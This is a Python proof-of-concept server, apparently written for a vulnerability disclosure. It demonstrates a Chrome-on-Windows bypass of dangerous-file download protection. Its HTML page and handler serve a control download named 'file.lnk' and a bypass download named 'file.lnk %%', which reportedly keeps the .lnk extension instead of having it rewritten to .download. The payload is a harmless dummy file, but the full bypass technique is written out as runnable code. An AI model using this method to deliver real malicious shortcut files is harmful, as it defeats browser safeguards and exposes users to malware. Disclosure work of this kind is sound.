#!/usr/bin/env python3
# PoC: Dangerous file download bypass via `%` in filename sanitization (Windows · Chrome)
# - Goal: ONLY “Save link as…” works; left-click does nothing.
# - Tiles are <a> links styled as images (data-URI background). No <img>, no external assets.
# - CONTROL: filename="file.lnk"   → expected Chrome rewrite to .download
# - BYPASS:  filename="file.lnk %%"→ on affected builds, may show "file.lnk .lnk"
# - Server serves payload.download bytes so saved file isn’t HTML and stays consistent if rewritten.

import os
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
from datetime import datetime

HOST, PORT = "127.0.0.1", 8080

DATA_URI_BG = (
    "data:image/svg+xml;base64,"
    "PHN2ZyB3aWR0aD0iODAwIiBoZWlnaHQ9IjUwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3Jn"
    "LzIwMDAvc3ZnIj48ZGVmcz48bGluZWFyR3JhZGllbnQgaWQ9ImciIHgyPSIxIiB5Mj0iMSI+"
    "PHN0b3Agb2Zmc2V0PSIwIiBzdG9wLWNvbG9yPSIjZWRmMmZmIi8+PHN0b3Agb2Zmc2V0PSIx"
    "IiBzdG9wLWNvbG9yPSIjY2FkYmZlIi8+PC9saW5lYXJHcmFkaWVudD48L2RlZnM+PHJlY3Qg"
    "d2lkdGg9IjgwMCIgaGVpZ2h0PSI1MDAiIGZpbGw9InVybCgjZykiIHJ4PSIyMCIvPjwvc3Zn"
    "Pg=="
)

INDEX_HTML = f"""<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>PoC — Dangerous file download bypass via % in filename sanitization (Windows · Chrome)</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    :root {{ --fg:#111; --bg:#fff; --muted:#555; --border:#e5e7eb; --accent:#0b5fff; --card:#fafafa; }}
    html,body {{ margin:0; padding:0; font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial; color:var(--fg); background:var(--bg); }}
    .container {{ max-width: 1060px; margin: 40px auto; padding: 0 20px; }}
    h1 {{ font-size: 1.75rem; margin: 0 0 12px; }}
    p {{ line-height: 1.6; }}
    .grid {{ display:grid; grid-template-columns: repeat(auto-fit, minmax(280px,1fr)); gap:22px; align-items:start; }}
    .card {{ border:1px solid var(--border); border-radius:16px; background:var(--card); padding:16px; }}
    .tile {{
      display:block; width:100%; aspect-ratio:16/10; border-radius:12px; overflow:hidden;
      border:1px solid var(--border); background: center/cover no-repeat url('{DATA_URI_BG}');
      position:relative; text-decoration:none; user-select:none;
    }}
    .tile:focus {{ outline: 2px solid var(--accent); outline-offset: 2px; }}
    .cta {{
      position:absolute; bottom:10px; left:10px; background:rgba(0,0,0,.6);
      color:#fff; padding:6px 10px; border-radius:8px; font-weight:600; font-size:0.95rem;
    }}
    .label {{ margin-top:12px; font-weight:700; }}
    .legend {{ margin-top:6px; font-size:0.94rem; color:var(--muted); }}
    .danger {{ color:#b00020; font-weight:700; }}
    footer {{ margin-top:28px; color:#666; font-size:0.9rem; }}
    code {{ background:#f3f4f6; padding:1px 4px; border-radius:4px; }}
  </style>
  <script>
    // Disable left-click on tiles (only context-menu Save link as... should be used)
    function blockClick(e) {{
      e.preventDefault();
      e.stopPropagation();
      return false;
    }}
    // Also block keyboard activation (Enter/Space)
    function blockKey(e) {{
      if (e.key === 'Enter' || e.key === ' ') {{
        e.preventDefault();
        e.stopPropagation();
        return false;
      }}
    }}
  </script>
</head>
<body>
  <div class="container">
    <header>
      <h1>PoC: Dangerous file download bypass via <code>%</code> in filename sanitization (Windows · Chrome)</h1>
      <p class="legend">
        <strong>Impact:</strong> Chrome normally blocks dangerous file types (e.g., <code>.lnk</code>) by rewriting them to <code>.download</code>.
        With crafted percent sequences in the suggested filename, sanitization can be bypassed and the dangerous extension can persist —
        sometimes appearing as a “double extension” (e.g., <em>file.lnk .lnk</em>). The real risk is delivery of files Chrome is supposed to block.
      </p>
      <p class="legend"><strong>How to use:</strong> Right-click a tile and choose <em>Save link as…</em>. Left-click is intentionally disabled.</p>
    </header>

    <section class="grid">
      <!-- CONTROL: plain .lnk (should be rewritten to .download) -->
      <div class="card">
        <a class="tile" href="/download?case=lnk_plain" target="_blank" rel="noopener"
           onclick="return blockClick(event)" onkeydown="return blockKey(event)"
           aria-label="Control: plain .lnk should be rewritten to .download">
          <div class="cta">Right-click → Save link as…</div>
        </a>
        <div class="label">Control — plain <code>file.lnk</code> → should become <code>.download</code></div>
        <div class="legend">
          Server sends: <code>Content-Disposition: attachment; filename="file.lnk"</code><br>
          <strong>Expected behavior:</strong> Chrome rewrites to <code>.download</code> (blocks shortcut execution).
        </div>
      </div>

      <!-- BYPASS: .lnk with '%%' (often leads to "file.lnk .lnk") -->
      <div class="card">
        <a class="tile" href="/download?case=lnk_pct" target="_blank" rel="noopener"
           onclick="return blockClick(event)" onkeydown="return blockKey(event)"
           aria-label="Bypass: .lnk with %% can yield double extension">
          <div class="cta">Right-click → Save link as…</div>
        </a>
        <div class="label danger">Bypass — <code>file.lnk %%</code> → often shown as <code>file.lnk .lnk</code></div>
        <div class="legend">
          Server sends: <code>Content-Disposition: attachment; filename="file.lnk %%"</code><br>
          <strong>Bypassed behavior:</strong> on affected builds, the dangerous <code>.lnk</code> survives (via double-extension), enabling shortcut delivery.
        </div>
      </div>
    </section>

    <section>
      <p class="legend">
        The response body is a harmless <code>payload.download</code> to avoid saving HTML. In a real attack, the payload could be a malicious shortcut.
        This PoC demonstrates that bypass is possible; the security concern is the ability to deliver dangerous formats (e.g., <code>.lnk</code>), not merely cosmetic filename issues.
      </p>
    </section>

    <footer>Served by <code>poc.py</code> — self-contained (no external assets). For responsible disclosure only.</footer>
  </div>
</body>
</html>
"""

def ensure_assets():
    if not os.path.exists("payload.download"):
        with open("payload.download", "wb") as f:
            f.write(b"# Dummy payload for PoC\n# Replace with harmless bytes if desired.\n")
    with open("index.html", "w", encoding="utf-8") as f:
        f.write(INDEX_HTML)

def http_date():
    return datetime.utcnow().strftime("%a, %d %b %Y %H:%M:%S GMT")

class Handler(BaseHTTPRequestHandler):
    def _send_bytes(self, body: bytes, headers: dict):
        self.send_response(200)
        for k, v in headers.items():
            self.send_header(k, v)
        self.send_header("X-Content-Type-Options", "nosniff")
        self.send_header("Cache-Control", "no-store, max-age=0")
        self.send_header("Pragma", "no-cache")
        self.send_header("Expires", http_date())
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _send_file(self, path: str, content_type: str):
        with open(path, "rb") as f:
            body = f.read()
        self._send_bytes(body, {"Content-Type": content_type})

    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path
        q = parse_qs(parsed.query)

        if path in ("/", "/index.html"):
            return self._send_file("index.html", "text/html; charset=utf-8")

        if path == "/download":
            case = (q.get("case", [""])[0] or "").lower()
            if case == "lnk_plain":
                disp_name = 'file.lnk'       # CONTROL: should be rewritten to .download
            elif case == "lnk_pct":
                disp_name = 'file.lnk %%'    # BYPASS: often becomes "file.lnk .lnk"
            else:
                disp_name = 'file.bin'       # fallback

            with open("payload.download", "rb") as f:
                body = f.read()

            headers = {
                "Content-Disposition": f'attachment; filename="{disp_name}"',
                "Content-Type": "application/octet-stream",
            }
            return self._send_bytes(body, headers)

        self.send_error(404, "Not Found")

def main():
    ensure_assets()
    print(f"[*] Serving PoC on http://{HOST}:{PORT}/")
    print("[*] Right-click → Save link as… ONLY. Left-click is disabled.")
    print("[*] Endpoints:")
    print('    /download?case=lnk_plain   (filename="file.lnk")   → CONTROL (should rewrite to .download)')
    print('    /download?case=lnk_pct     (filename="file.lnk %%") → BYPASS  (may show "file.lnk .lnk")')
    HTTPServer((HOST, PORT), Handler).serve_forever()

if __name__ == "__main__":
    main()